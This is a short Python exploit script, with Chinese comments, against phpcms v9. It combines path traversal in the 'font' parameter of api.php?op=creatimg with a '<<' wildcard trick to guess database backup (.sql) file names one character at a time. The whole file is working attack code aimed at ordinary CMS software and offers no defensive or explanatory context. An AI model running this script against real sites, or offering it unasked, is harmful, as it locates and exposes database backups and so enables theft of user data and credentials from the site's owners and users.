import requests
import time

# phpcms v9 数据库备份文件猜解漏洞 exp ; 递归猜测

url = 'http://127.0.0.1/phpcms/961/api.php?op=creatimg&txt=1&font=/../../../../caches/bakup/default/'  # 6<<.sql


def guest(url):
    w = '<<'
    words = '_1234567890qwertyuioplkjhgfdsazxcvbnm'
    bigwords = 'QWERTYUIOPLKJHGFDSAZXCVBNM'  # linux 加入大写区分
    for word in words:
        # time.sleep(0.5)
        zurl = url + word + w
        r = requests.get(zurl)
        if "PNG" in r.text:
            print(url + word + '.sql')
            durl = url + word
            guest(durl)
        else:
            pass


if __name__ == '__main__':
    guest(url)
